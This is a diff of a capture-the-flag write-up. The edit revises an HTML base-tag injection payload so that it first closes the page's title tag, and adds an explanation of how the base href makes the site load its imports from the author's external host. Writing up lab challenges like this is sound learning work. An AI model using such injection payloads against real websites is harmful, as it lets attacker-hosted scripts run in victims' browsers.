@@ -259,8 +259,10 @@ The github pages is available at [payload.jh123x.com](http://payload.jh123x.com/
 The payload that I used for the base injection is shown below and the github link upload is hosted at that url.
 
 ```html
-<base href="http://payload.jh123x.com/" />
+</title><base href="http://payload.jh123x.com/" />
 ```
+
+The `</title>` closes the title tag and the `<base>` tag is the payload. The `href` attribute is the base url that the website will use to import from.
 
 After tinkering around for a few hours, I manage to get the redirect and the flag was mine.
 
